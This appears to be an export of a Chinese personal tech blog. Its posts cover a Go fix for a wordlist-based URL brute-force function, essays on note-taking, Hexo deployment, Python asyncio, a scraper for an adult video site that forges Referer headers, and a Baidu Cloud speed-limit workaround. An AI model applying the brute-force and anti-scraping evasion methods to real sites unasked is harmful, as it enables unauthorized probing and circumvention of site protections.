fmt.Printf("\n读取字典完成，准备开始，请等待...\n") return urlList &#125; &#125;&#125; 我把取一行的方式换成bufio.NewScanner就正常了123456789func ReturnBurstURL(fURL *os.File, baseurl string) (urlList []string) &#123; allURLTxt := bufio.NewScanner(fURL) for allURLTxt.Scan() &#123; newurl := baseurl + allURLTxt.Text() urlList = append(urlList, newurl) &#125; fmt.Printf("\n读取字典完成，准备开始，请等待...\n") return urlList&#125; 网上读取文件一行很多人写的文章是第一种方法，但是我也不知道什么问题导致这种情况的发生我特地去查了查api文档12345678910func NewReader(rd io.Reader) *Reader//NewReader returns a new Reader whose buffer has the default size. func (b *Reader) ReadString(delim byte) (string, error)//ReadString reads until the first occurrence of delim in the input, returning a string containing the data up to and including the delimiter. If ReadString encounters an error before finding a delimiter, it returns the data read before the error and the error itself (often io.EOF). ReadString returns err != nil if and only if the returned data does not end in delim. For simple uses, a Scanner may be more convenient. func NewScanner(r io.Reader) *Scanner//NewScanner returns a new Scanner to read from r. The split function defaults to ScanLines. func (s *Scanner) Scan() bool//Scan advances the Scanner to the next token, which will then be available through the Bytes or Text method. It returns false when the scan stops, either by reaching the end of the input or an error. After Scan returns false, the Err method will return any error that occurred during scanning, except that if it was io.EOF, Err will return nil. Scan panics if the split function returns 100 empty tokens without advancing the input. This is a common error mode for scanners. func (s *Scanner) Text() string//Text returns the most recent token generated by a call to Scan as a newly allocated string holding its bytes. 按照上面的api文档，这两个的区别就是两者在返回string的时候，一个是数据+分隔符，一个是一行的数据，不带分隔符虽说我第一种方法也用strings.Replace方法把”\n”替换成了””空字符，但是可能还是有点奇奇怪怪的东西 转载请注明出处]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[笔记带给我们是真实的知识增长么？你需要好好考虑了]]></title>
      <url>%2F2017%2F01%2F21%2F%E7%AC%94%E8%AE%B0%E5%B8%A6%E7%BB%99%E6%88%91%E4%BB%AC%E6%98%AF%E7%9C%9F%E5%AE%9E%E7%9A%84%E7%9F%A5%E8%AF%86%E5%A2%9E%E9%95%BF%E4%B9%88%EF%BC%9F%E4%BD%A0%E9%9C%80%E8%A6%81%E5%A5%BD%E5%A5%BD%E8%80%83%E8%99%91%E4%BA%86.html</url>
      <content type="text"><![CDATA[我有段时间疯狂使用各类笔记软件，相信什么云记忆，第二大脑之类的说法。后来发现，没啥意义。记多了根本看不完，你在当时没时间看的，过后更没时间看。笔记唯一剩下的作用就是检索，但是你没看过的内容，你又怎么知道要检索啥呢？而且，自己维护的资料库，怎么也没办法跟google的检索比。善用google的搜索规则，比浪费时间剪藏保存一大堆网页有效得多。其实滥用或者过分依赖这些笔记软件，最大的坏处是产生了知识增长的错觉。剪藏一篇机器学习的长文，就以为自己的知识增长了，其实只扫了一眼前言。 下载了一系列新框架的开发教程，三分钟热度把开发环境搭建完，跟着第一章跑了个hello world就弃坑了，但还是在欺骗自己，觉得自己已经掌握了，最不济那些教程已经被我收到硬盘里了，要用的时候再翻出来学嘛。而且，这种廉价的获得知识的错觉，带来的成就感比真的花时间去学习还要强，甚至会形成“要开工了-&gt;先了解下业界动态，去各大论坛微博逛一圈-&gt;哇，又有这么多新教程/技巧/开源库，看不过来，先保存到笔记软件 -&gt; 啊，不知不觉居然花了一个小时，不过我又不是打游戏看电影，是在收集知识，对自己还是有帮助的，不算虚度时光吧 -&gt; 继续开工，嗯？这个问题好像看到过更好的解决办法，要不要试着优化下？算了算了，反正办法在笔记里存着，以后有时间再重构吧 -&gt;…” 那几个月里我一直就陷在这样的循环里，同时还沾沾自喜于自己的“努力”而不自觉。直到某天，有个面试者坐到我面前时，我惊讶于他面谈时对各类业界动态新框架新技术口若悬河，但是实际的笔试题目却做得惨不忍睹，有些基础概念题都直接留白。我试探性地问了下原因，结果他特别诚恳地看着我说，这些问题的答案都存在他包里的笔记本电脑里，只要他想，分分钟就能搜出来。 当时我下意识地反问了一句：“那谁不会啊？” 说完我自己都惊了一下。 那天之后，我很少再去碰那些笔记软件了。第二大脑什么的都是骗人的，在我得老年痴呆之前，应该不会特别依赖它们。曾经我一个月要从各大技术论坛微博twitter上收集几十篇教程，上百篇技术长文，真正看完的，不到五篇。之后我发现，把产生这些知识的源头掐掉，统统加到127.0.0.1里去，节省下的时间认认真真读几本经典纸质书，跟着官方文档走一遍教程，不收集，多动手多思考，技术长进比之前快得多。实际做项目的时候碰到解决不了的问题怎么办？直接开google去搜呗。根本没必要去浪费时间维护一个私人的知识库。 在人类数千年漫长的文明史中，收藏本来是一件相当奢侈，大量耗费金钱、时间、精力的事情。但到了互联网的时代，这一切被简化成了点点鼠标就能完成的美事。或许因为盗版盛行的原因，它几乎已经是免费的，但它对于个体时间精力的耗费，却始终没有变化。而且，躺在硬盘里的资源们，就像王阳明的花一样，你未看它时，它与你同归于寂，一点关系都没有。 《银河英雄传说》里杨威利说过一句名言：“如果你不记得了，那说明它不重要。” 或许可以再补充一句，“如果你看不完，那就没必要看完。” 大概就是这样，不知不觉写了这么多，与所有现在或曾经的互联网资源收集成瘾症患者共勉。 转自V2EX一位v友的回答]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[PKM（个人知识管理）类软件收集(偶尔更新列表)]]></title>
      <url>%2F2017%2F01%2F21%2FPKM%EF%BC%88%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%EF%BC%89%E7%B1%BB%E8%BD%AF%E4%BB%B6-%E5%81%B6%E5%B0%94%E6%9B%B4%E6%96%B0%E5%88%97%E8%A1%A8.html</url>
      <content type="text"><![CDATA[evernote(印象笔记) Wiz有道云 麦库 leanote GoogleKeep OneNote SimpleNote(wp家的，免费) pocket(稍后读的软件，同类的还有Instapaper，国内的收趣) MyBase RaysNote(v友开发) CintaNotes https://jitaku.io 开源 Gitit-Bigger Laverna paperwork DokuWiki leanote PermaNote CherryTree BrainStorm]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[web高级开发的成长之路]]></title>
      <url>%2F2017%2F01%2F20%2Fweb%E9%AB%98%E7%BA%A7%E5%BC%80%E5%8F%91%E7%9A%84%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF.html</url>
      <content type="text"><![CDATA[读了这篇文章之后感觉蛮受启发的，在此分享一下，献给和我一样处于困惑的朋友。 正文如下：本人也是coding很多年，虽然很失败，但也总算有点失败的心得，不过我在中国，大多数程序员都是像我一样，在一直走着弯路。如果想成为一个架构师，就必须走正确的路，否则离目标越来越远，正在辛苦工作的程序员们，你们有没有下面几种感觉？ 一、我的工作就是按时完成领导交给我的任务，至于代码写的怎样，知道有改进空间，但没时间去改进，关键是领导也不给时间啊。 二、我发现我的水平总是跟不上技术的进步，有太多想学的东西要学，jQuery用的人最近比较多啊，听说最近MVC比较火，还有LINQ，听说微软又有Silverlight了…… 三、我发现虽然我工作几年了，除了不停的coding，Ctrl+C和Ctrl+V更熟练了，但编码水平并没有提高，还是一个普通程序员，但有人已经做到架构师了。 四、工作好几年了，想跳槽换个工作，结果面试的考官都问了一些什么数据结构，什么垃圾回收，什么设计模式之类的东西，虽然看过，但是平时用不着，看了也忘记了，回答不上来，结果考官说我基础太差。。。 有没有，如果没有，接下来就不用看了，你一定是大拿了，或者已经明白其中之道了，呵呵。 如果有，恭喜你，你进入学习误区了，如果想在技术上前进的话，就不能一直的coding，为了完成需求而工作，必须在coding的同时，让我们的思维，水平也在不停的提高。 写代码要经历下面几个阶段。 一 、你必须学习面向对象的基础知识，如果连这个都忘了，那你的编程之路注定是在做原始初级的重复！ 很多程序员都知道类、方法、抽象类、接口等概念，但是为什么要面向对象，好处在哪里，要解决什么问题？只是明白概念，就是表达不清楚，然后在实 际工作中也用不上，过了一段时间，面向对象的东西又模糊了，结果是大多数程序员用着面向对象的语言做着面向过程的工作，因此要学习面向对象，首先应该明白 面向对象的目的是什么？ 面向对象的目的是什么？ 开发语言在不断发展，从机器语言，到汇编，到高级语言，再到第四代语言;软件开发方法在不断发展，从面向过程，面向对象，到面向方面等。虽然这些都在不断发展，但其所追求的目标却一直没变，这些目标就是： 1. 降低软件开发的复杂度 2. 提高软件开发的效率 3. 提高软件质量：可维护性，可扩展性，可重用性等。 其中语言的发展，开发方法的发展在1,2两条上面取得了极大的进步，但对于第3条，我们不能光指望开发方法本身来解决。 提高软件质量：可维护性，可扩展性，可重用性等，再具体点，就是高内聚、低耦合，面向对象就是为了解决第3条的问题。因此要成为一个好的程序员，最绕不开的就是面向对象了。 二、 要想学好面向对象，就必须学习设计模式。 假定我们了解了面向对象的目的，概念了，但是我们coding过程中却发现，我们的面向对象的知识似乎一直派不上用场，其实道理很简单，是因为 我们不知道怎么去用，就像游泳一样，我们已经明白了游泳的好处，以及游泳的几种姿势，狗刨、仰泳、蛙泳、自由泳，但是我们依然不会游泳。。。。 因此有了这些基本原则是不行的，我们必须有一些更细的原则去指导我们的设计，这就有了更基础的面向对象的五大原则，而把这几种原则更详细的应用 到实际中来，解决实际的问题，这就是设计模式。因此要学好OO，必须要学习设计模式，学习设计模式，按大师的话说，就是在人类努力解决的许多领域的成功方 案都来源于各种模式，教育的一个重要目标就是把知识的模式一代一代传下去。 因此学习设计模式，就像我们在看世界顶级的游泳比赛，我们为之疯狂，为之着迷。 三、学习设计模式 正像我们并不想只是看别人表演，我们要自己学会游泳，这才是我们的目的所在。 当我们看完几篇设计模式后，我们为之精神振奋，在新的coding的时候，我们总是想努力的用上学到的设计模式，但是经常在误用模式，折腾半天发现是在脱裤子抓痒。。。 当学完设计模式之后，我们又很困惑，感觉这些模式简直太像了，很多时候我们分不清这些模式之间到底有什么区别，而且明白了设计过程中的一个致命 的东西——过度设计，因为设计模式要求我们高扩展性，高重用性，但是在需求提出之初，我们都不是神，除了依靠过去的经验来判断外，我们不知道哪些地方要扩 展，哪些地方要重用，而且过去的经验就一定是正确的吗？所以我们甚至不敢再轻易用设计模式，而是还一直在用面向过程的方法在实现需求。 四、学习重构 精彩的代码是怎么想出来的，比看到精彩的代码更加令人期待。于是我们开始思考，这些大师们莫非不用工作，需求来了没有领导规定完成时间，只以设 计精彩的代码为标准来开展工作？这样的工作太爽了，也不可能，老板不愿意啊。就算这些理想的条件他都有，他就一开始就设计出完美的代码来了？也不可能啊， 除非他是神，一开始就预料到未来的所有需求，那既然这些条件都没有，他们如何写出的精彩代码？ Joshua Kerievsky在那篇著名的《模式与XP》〔收录于《极限编程研究》一书）中明白地指出：在设计前期使用模式常常导致过度工程（over- engineering)。这是一个残酷的现实，单凭对完美的追求无法写出实用的代码，而「实用」是软件压倒一切的要素。 在《重构——改善既有的代码的设计》一书中提到，通过重构（refactoring），你可以找出改变的平衡点。你会发现所谓设计不再是一切动 作的前提，而是在整个开发过程中逐渐浮现出来。在系统构筑过程中，你可以学习如何强化设计；其间带来的互动可以让一个程序在开发过程中持续保有良好的设 计。 总结起来就是说，我们在设计前期就使用设计模式，往往导致设计过度，因此应该在整个开发过程，整个需求变更过程中不断的重构现在的代码，才能让 程序一直保持良好的设计。由此可见，开发过程中需要一直重构，否则无论当初设计多么的好，随着需求的改变，都会变成一堆烂代码，难以维护，难以扩展。所谓 重构是这样一个过程：「在不改变代码外在行为的前提下，对代码做出修改，以改进程序的内部结构」。重构的目标，就是设计模式，更本质的讲就是使程序的架构 更趋合理，从而提高软件的可维护性，可扩展性，可重用性。 《重构——改善既有的代码的设计》一书也是Martin Fowler等大师的作品，软件工程领域的超级经典巨著，与另一巨著《设计模式》并称”软工双雄”，不可不读啊。 五、开始通往优秀软件设计师的路上 通过设计模式和重构，我们的所学和我们工作的coding终于结合上了，我们可以在工作中用面向对象的思维去考虑问题，并开始学习重构了。这就 像游泳一样，我们看完了各种顶级的游泳比赛，明白各种规则，名人使用的方法和技巧，现在是时候回家去村旁边的小河里练练了。练习也是需要有教练的，推荐另 一本经典书叫《重构与模式》，引用他开篇的介绍，本书开创性地深入揭示了重构与模式这两种软件开发关键技术之间的联系，说明了通过重构实现模式改善既有的 设计，往往优于在新的设计早期使用模式。本书不仅展示了一种应用模式和重构的创新方法，而且有助于读者结合实战深入理解重构和模式。 这本书正是我们需要的教练，值得一读。 六、没有终点，只有坚持不懈的专研和努力。 经过了几年的坚持，终于学会了灵活的运用各种模式，我们不需要去刻意的想用什么模式，怎么重构。程序的目标，就是可维护性，可扩展性，可重用 性，都已经成了一种编程习惯，一种思维习惯，就像我们练习了几年游泳之后，我们不用再刻意的去考虑，如何让自己能在水上漂起来，仰泳和蛙泳的区 别….. 而是跳进水里，就自然的游了起来，朝对岸游去。但是要和大师比起来，嘿嘿，我们还有很长的路要走，最终也可能成不了大师，但无论能不能成为大师，我们已经 走在了成为大师的正确的路上，我们和别的程序员已经开始不一样，因为他们无论再过多少年，他们的水平不会变，只是在重复造轮子，唯一比你快的，就是 Ctrl+C和Ctrl+V。 正确的路上，只要坚持，就离目标越来越近，未来就一定会是一个优秀的架构师，和优秀架构师的区别，可能只是时间问题。 转自李凡的博客]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[hexo在github和coding.net部署并分流（一）]]></title>
      <url>%2F2017%2F01%2F10%2Fhexo%E5%9C%A8github%E5%92%8Ccoding-net%E9%83%A8%E7%BD%B2%E5%B9%B6%E5%88%86%E6%B5%81%EF%BC%88%E4%B8%80%EF%BC%89-1.html</url>
      <content type="text"><![CDATA[安装GIT和Node.JS首先在自己的电脑上安装好git和node.js，这一步怎么做自己搜索，安装软件都是下一步下一步，应该不难,GIT安装完成后打开git cmd输入12git config --global user.name "Your Name"git config --global user.email "email@example.com" 因为Git是分布式版本控制系统，所以，每个机器都必须自报家门：你的名字和Email地址。注意：git config命令的–global参数，用了这个参数，表示你这台机器上所有的Git仓库都会使用这个配置，当然也可以对某个仓库指定不同的用户名和Email地址。 #安装并初始化HEXO如果你是在Windows上，请打开Git-CMD假如你是想在D:\blog\下建立你的博客，请先在D盘下新建文件夹blog在Git-CMD中输入npm install -g hexo-cli回车开始安装hexo安装完成后将git cmd工作目录切换至D:\blog\然后输入hexo init回车，或者直接在git cmd中输入hexo init d:\\blog如果你的d:\blog\下的目录形式是12345678.├── _config.yml // 网站的配置信息，你可以在此配置大部分的参数。├── package.json ├── scaffolds // 模板文件夹。当你新建文章时，Hexo会根据scaffold来建立文件。├── source // 存放用户资源的地方| ├── _drafts| └── _posts└── themes // 存放网站的主题。Hexo会根据主题来生成静态页面。 那么你的hexo安装并初始化完成然后输入hexo server启动本地demo，打开浏览器，查看http://localhost:4000/可以看到自己的博客 将之托管到github和coding上github项目创建1.注册github账号2.创建项目仓库进入github.com，然后点击右上角 + –&gt;new repository 3.在Repository name中填写Github账号名.github.io，点击Create repository，完成创建。 Coding项目创建1.注册Coding账号2.创建项目仓库 3.填写项目名称描述创建即可 配置SHH配置shh key是让本地git项目与远程的github建立联系1.检查是否已经有SSH Key，打开Git Bash，输入1cd ~/.ssh 2.如果没有.ssh这个目录，则生成一个新的SSH，输入1ssh-keygen -t rsa -C "your e-mail" 注意1: 此处的邮箱地址，你可以输入自己的邮箱地址；注意2: 此处的「-C」的是大写的「C」接下来几步都直接按回车键,然后系统会要你输入密码12Enter passphrase (empty for no passphrase):&lt;输入加密串&gt;Enter same passphrase again:&lt;再次输入加密串&gt; 这个密码会在你提交项目时使用，如果为空的话提交项目时则不用输入。这个设置是防止别人往你的项目里提交内容。个人建议为空比较方便注意：输入密码的时候没有*字样的，你直接输入就可以了。3.最后看到这样的界面，就成功设置ssh key了 添加 SSH Key 到 GitHub和Coding复制~/.ssh/id_rsa.pub中的内容~是个人文件夹，比如我的电脑上是C:\Users\Administrator.ssh\id_rsa.pub，将其中的文本复制进入github，点击头像–&gt;Setting–&gt;SSH and GPG keys,然后在右侧点击New SSH key，Title随便写，key中填写id_rsa.pub中复制的内容，然后Add SSH key就ok了进入Coding.net，点击头像–&gt;个人设置–&gt;SSH公钥，新增公钥，公钥名称随便，公钥内容是填写id_rsa.pub中复制的内容，有效期可以勾选永久，然后添加ok 测试SSH是否配置成功1.打开Git Bash，然后输入1ssh -T git@github.com 如配置了密码则要输入密码,输完按回车如果显示以下内容，则说明Github中的ssh配置成功。12Hi username! You've successfully authenticated, but GitHub does notprovide shell access. 2.再输入1ssh -T git@git.coding.net 如果显示以下则说明coding中的ssh配置成功1Hello username You've connected to Coding.net by SSH successfully! 创建Github Pages和Coding Pages 服务1.GitHub Pages分两种，一种是你的GitHub用户名建立的username.github.io这样的用户&amp;组织页（站），另一种是依附项目的pages。想建立个人博客是用的第一种，形如cnfeat.github.io这样的可访问的站，每个用户名下面只能建立一个。Coding Pages服务开启在官网说的很详细，不知道请百度2.打开D:\blog文件夹中的_config.yml文件，找到如下位置，填写1234567# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy:- type: git repo: github: git@github.com:yourname/yourname.github.io.git,master coding: git@git.coding.net:yourname/yourname.git,coding-pages 注： (1) 其中yourname替换成你的Github账户名;(2)注意在yml文件中，:后面都是要带空格的。 #部署完成在blog文件夹中空白处右击打开Git Bash输入12hexo cleanhexo d- g 此时，通过访问http://yourname.github.io和http://yourname.coding.me可以看到默认的Hexo首页面（与之前本地测试时一样）。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python异步爬虫的学习(一)]]></title>
      <url>%2F2016%2F12%2F11%2FPython%E5%BC%82%E6%AD%A5%E7%88%AC%E8%99%AB%E7%9A%84%E5%AD%A6%E4%B9%A0(%E4%B8%80).html</url>
      <content type="text"><![CDATA[本文主要从一下几个方面进行说明: 什么是异步(Asynchronous)编程 为什么要使用异步编程？ 如何利用Python实现异步 什么是异步编程文章开始前，先简单介绍下各种 IO 模型：最容易做的是阻塞 IO即读写数据时，需要等待操作完成，才能继续执行。进阶的做法就是用多线程来处理需要 IO 的部分，缺点是开销会有些大。 接着是非阻塞 IO即读写数据时，如果暂时不可读写，则立刻返回，而不等待。因为不知道什么时候是可读写的，所以轮询时可能会浪费 CPU 时间。 然后是 IO 复用即在读写数据前，先检查哪些描述符是可读写的，再去读写。select 和 poll 就是这样做的，它们会遍历所有被监视的描述符，查看是否满足，这个检查的过程是阻塞的。而 epoll、kqueue 和 /dev/poll 则做了些改进，事先注册需要检查哪些描述符的哪些事件，当状态发生变化时，内核会调用对应的回调函数，将这些描述符保存下来；下次获取可用的描述符时，直接返回这些发生变化的描述符即可。 再之后是信号驱动即描述符就绪时，内核发送 SIGIO 信号，再由信号处理程序去处理这些信号即可。不过信号处理的时机是从内核态返回用户态时，感觉也得把这些事件收集起来才好处理，有点像模拟 IO 复用了。 最后是异步 IO即读写数据时，只注册事件，内核完成读写后（读取的数据会复制到用户态），再调用事件处理函数。这整个过程都不会阻塞调用线程，不过实现它的操作系统比较少，Windows 上有比较成熟的 IOCP，Linux 上的 AIO 则有不少缺点。虽然真正的异步 IO 需要中间任何步骤都没有阻塞，这对于某些只是偶尔需要处理 IO 请求的情况确实有用（比如文本编辑器偶尔保存一下文件）；但对于服务器端编程的大多数情况而言，它的主线程就是用来处理 IO 请求的，如果在空闲时不阻塞在 IO 等待上，也没有别的事情能做，所以本文就不纠结这个异步是否名副其实了。 然后我们了解一下事件循环(Event Loop)Event Loop 是一个很重要的概念，指的是计算机系统的一种运行机制。 我们一般的单线程程序中，所有任务需要排队，前一个任务结束，才会执行后一个任务。如果前一个任务耗时很长，后一个任务就不得不一直等着。 如果排队是因为计算量大，CPU忙不过来，倒也算了，但是很多时候CPU是闲着的，因为IO设备（输入输出设备）很慢（比如Ajax操作从网络读取数据），不得不等着结果出来，再往下执行。 那么这时主线程完全可以不管IO设备，挂起处于等待中的任务，先运行排在后面的任务。等到IO设备返回了结果，再回过头，把挂起的任务继续执行下去。 于是，所有任务可以分成两种，一种是同步任务（synchronous），另一种是异步任务（asynchronous）。同步任务指的是，在主线程上排队执行的任务，只有前一个任务执行完毕，才能执行后一个任务；异步任务指的是，不进入主线程、而进入”任务队列”（task queue）的任务，只有”任务队列”通知主线程，某个异步任务可以执行了，该任务才会进入主线程执行。具体来说，异步执行的运行机制如下。（同步执行也是如此，因为它可以被视为没有异步任务的异步执行。） （1）所有同步任务都在主线程上执行，形成一个执行栈（execution context stack）。 （2）主线程之外，还存在一个&quot;任务队列&quot;（task queue）。只要异步任务有了运行结果，就在&quot;任务队列&quot;之中放置一个事件。 （3）一旦&quot;执行栈&quot;中的所有同步任务执行完毕，系统就会读取&quot;任务队列&quot;，看看里面有哪些事件。那些对应的异步任务，于是结束等待状态，进入执行栈，开始执行。 （4）主线程不断重复上面的第三步。 下图就是主线程和任务队列的示意图。 只要主线程空了，就会去读取”任务队列”，这个过程会不断重复。 所谓异步是相对于同步（Synchronous）的概念来说的，之所以容易造成混乱，是因为刚开始接触这两个概念时容易把同步看做是同时，而同时不是意味着并行（Parallel）吗？然而实际上同步或者异步是针对于时间轴的概念，同步意味着顺序、统一的时间轴，而异步则意味着乱序、效率优先的时间轴。比如在爬虫运行时，先抓取 A 页面，然后从中提取下一层页面 B 的链接，此时的爬虫程序的运行只能是同步的，B 页面只能等到 A 页面处理完成之后才能抓取；然而对于独立的两个页面 A1 和 A2，在处理 A1 网络请求的时间里，与其让 CPU 空闲而 A2 等在后面，不如先处理 A2，等到谁先完成网络请求谁就先来进行处理，这样可以更加充分地利用 CPU，但是 A1 和 A2 的执行顺序则是不确定的，也就是异步的。 为什么要使用异步编程？CPU的速度远远快于磁盘、网络等IO。在一个线程中，CPU执行代码的速度极快，然而，一旦遇到IO操作，如读写文件、发送网络数据时，就需要等待IO操作完成，才能继续进行下一步操作。这种情况称为同步IO。 在IO操作的过程中，当前线程被挂起，而其他需要CPU执行的代码就无法被当前线程执行了。 因为一个IO操作就阻塞了当前线程，导致其他代码无法执行，所以我们必须使用多线程或者多进程来并发执行代码，为多个用户服务。每个用户都会分配一个线程，如果遇到IO导致线程被挂起，其他用户的线程不受影响。 多线程和多进程的模型虽然解决了并发问题，但是系统不能无上限地增加线程。由于系统切换线程的开销也很大，所以，一旦线程数量过多，CPU的时间就花在线程切换上了，真正运行代码的时间就少了，结果导致性能严重下降。 由于我们要解决的问题是CPU高速执行能力和IO设备的龟速严重不匹配，多线程和多进程只是解决这一问题的一种方法。 另一种解决IO问题的方法是异步IO。当代码需要执行一个耗时的IO操作时，它只发出IO指令，并不等待IO结果，然后就去执行其他代码了。一段时间后，当IO返回结果时，再通知CPU进行处理。 如何利用Python实现异步我们首先需要了解以下几个概念： Event Loop Coroutine 其中Event Loop在前面已经解释过Coroutine是协程，具体解释可以查阅协程 Python 3.5 以后推荐使用 async/await 关键词来定义协程，它具有如下特性： 通过 await 将可能阻塞的行为挂起，直到有结果之后继续执行，Event loop 也是据此来对多个协程的执行进行调度的； 协程并不像一般的函数一样，通过 coro() 进行调用并不会执行它，而只有将它放入 Event loop 进行调度才能执行。 这里我就从廖大哪里搬运个小例子(有改动)123456789101112import threadingimport asyncioasync def hello(): print('Hello world! (%s)' % threading.currentThread()) await asyncio.sleep(1) print('Hello again! (%s)' % threading.currentThread())loop = asyncio.get_event_loop()tasks = [hello(), hello()]loop.run_until_complete(asyncio.wait(tasks))loop.close() 执行结果 12345Hello world! (&lt;_MainThread(MainThread, started 140735195337472)&gt;)Hello world! (&lt;_MainThread(MainThread, started 140735195337472)&gt;)(暂停约1秒)Hello again! (&lt;_MainThread(MainThread, started 140735195337472)&gt;)Hello again! (&lt;_MainThread(MainThread, started 140735195337472)&gt;) 其中sleep是我们模拟的io用时，我么你可以从这个小例子中看出，执行hello()的时候，io并未堵塞，而是继续向下执行hello()会首先打印出Hello world!，然后，由于asyncio.sleep()是一个coroutine，所以线程不会等待asyncio.sleep()，而是直接中断并执行下一个消息循环。当asyncio.sleep()完成时，线程就可以接着执行下一行语句。 下一篇文章将在此基础上实现一个简洁、普适的爬虫框架]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[javbus爬虫-老司机你值得拥有]]></title>
      <url>%2F2016%2F12%2F06%2Fjavbus%E7%88%AC%E8%99%AB-%E8%80%81%E5%8F%B8%E6%9C%BA%E4%BD%A0%E5%80%BC%E5%BE%97%E6%8B%A5%E6%9C%89.html</url>
      <content type="text"><![CDATA[起因 有个朋友叫我帮忙写个爬虫，爬取javbus5上面所有的详情页链接，也就是所有的https://www.javbus5.com/SRS-055这种链接，我一看，嘿呀，这是司机的活儿啊，我绝对不能辱没我老司机的名声（被败坏了可不好），于是开始着手写了 构思 爬虫调度启动程序crawler.py 页面下载程序downloader.py 页面解析程序pageparser.py 数据库入库与去重管理程序controler.py 爬取入口为第一页，当页面中存在下一页的超链接继续往下爬，这是个死循环，跳出条件为没有了下一页的链接 在某一页中解析页面，返回所有的详情页链接，利用迭代器返回，然后在主程序中调用解析程序对页面信息进行解析并包装成字典返回，其中用详情页网址作为数据库主键，其他信息依次写入数据库 当这一页所有的子链接爬取完成后，继续爬取下一页。 将数据存入数据库，用的是sqllite3,失败的网址页存入一个fail_url.txt。 对于增量爬取，我是这么做的，当爬取到相同的网址时结束程序，这么做也有漏洞，才疏学浅，我没想到太好的办法，希望有好办法的给我说一声（布隆过滤正在研究之中），如果用数据库查询去重，那么势必导致二次爬取，我们都知道，爬虫更多的时间是花在网络等待上 问题 在写爬虫的过程中遇到了一些问题 在墙内爬不动，爬取几个之后就失败，这个解决方案只需要全局翻墙爬取就可以了 本来之前加了多线程并发爬取，但是发现爬取一段时间后会封ip导致整体无法运行，本来想搞个代理池进行并发，结果网上免费的代理太慢太慢，根本打不开网页，于是就改回了单线程 就是我的那个不完善的增量爬取，导致了你一次爬取就需要爬取完成，不然数据库里面存在你之前爬到的，爬取到你已有的会直接停止 存在反扒策略详情页中的磁力链接是ajax动态加载的，通过分析抓包，可以在XHR中找到是一个get请求，至于参数，我开始不知道怎么得来的，后来在html代码中找到了，我放几张图大家就明白了 我们通过对响应内容的查看可以发现磁力的加载访问了类似于这样一个网址 1https://www.javbus5.com/ajax/uncledatoolsbyajax.php?gid=30100637207&amp;lang=zh&amp;img=https://pics.javbus.info/cover/59pc_b.jpg&amp;uc=0&amp;floor=921 那么这些get参数是从哪里来呢，这就是通过经验与基本功去发现了 通过对html源文件的搜索，我们即可直接发现答案通过分析发现，后面的floor是个随机数参数，一般这种参数可以去除无影响，事实也是这样 我利用HttpRequest模拟发包，对这个请求直接get，发现所有数据隐藏 那么肯定是有反扒的策略，伪造请求头，反扒也就那么几种，通过分析发现是同源策略，对Referer请求头伪造成来源网址就可以直接获取到内容了 常见的Python2.x编码问题,全部转换为unicode字节流就可以了 这个问题在我博客中已经记录了http://www.53xiaoshuo.com/Python/77.html 有兴趣的童鞋可以看看 遇到的最闹心问题是详情页的项目抓取，有的详情页的类别不同，我开始只分析了一个页面，导致写的规则在有的页面上频频出错导致后面对抓取规则进行了大改,重写了分析规则，用了个笨办法，毕竟那小块的html写的十分不规范，正则规则有三种，挺烦人比如上图的两个就不同，html代码更是稀烂，需要判断有没有这个项，没有就设置空字节入库 在这其中纠结了一个问题 就是对于这两种的比较，我想上面这种变成下面这种，毕竟第一种的话，soup.find要执行两次，但是下面这种又要比上面那个多一行，丑一点最后我选择了第二种，所有的信息分析代码就不贴了，具体想看的直接看我的代码文件就好了 小Tips 对于动态加载的内容的爬取，能不用selenium去模拟浏览器爬取就不用，耗费资源，更好的是自己分析网络请求，然后构造 对于页面信息的解析，要多看几个页面，看是否相同，别到时候做多事情 多看别人的博客学习思路 注意 爬虫依赖的第三方库有Requests，BeautifulSoup，使用前请先pip install这两个第三方库 测试展与地址 代码地址: coding.net javbus_crawler github.com javbus_crawler 司机的名声总算是没有辱没，秋名山依旧，嘿嘿 转载请注明来源作者 博客：53xiaoshuo.com | hacktech.cn 作者：Akkuman]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[突破百度云限速与网页限制批量下载]]></title>
      <url>%2F2016%2F12%2F06%2F%E7%AA%81%E7%A0%B4%E7%99%BE%E5%BA%A6%E4%BA%91%E9%99%90%E9%80%9F%E4%B8%8E%E7%BD%91%E9%A1%B5%E9%99%90%E5%88%B6%E6%89%B9%E9%87%8F%E4%B8%8B%E8%BD%BD.html</url>
      <content type="text"><![CDATA[百度云限速比较坑，现在基本200k左右很多人都知道了，但是总有朋友问我，我说明一下 首先下载IDM(最好支持正版)下载链接：百度云shaoit 开始下载：一般的话，小文件直接打开浏览器就可以下载 大文件下载：首先在chrome浏览器中装上一个User-Agent Switcher for (Google)Chrome插件,然后选择安卓手机，也就是打开这个的手机页面，然后直接用IDM下载 批量下载与外链获取使用这个脚本，具体看链接内介绍 https://greasyfork.org/zh-CN/scripts/23635-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%E5%8A%A9%E6%89%8B 如何安装用户脚本 Firefox 及相关的浏览器：Greasemonkey。 Google Chrome、Chromium 及相关的浏览器：Tampermonkey。 Opera (版本 15 及更晚)：Tampermonkey 或者 Violentmonkey。 Opera 版本 12 及更早原生支持用户脚本。但 Violentmonkey 能提供更友好的界面和更好的兼容性。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ProgrammingError: You must not use 8-bit bytestrings...]]></title>
      <url>%2F2016%2F12%2F06%2FProgrammingError-You-must-not-use-8-bit-bytestrings.html</url>
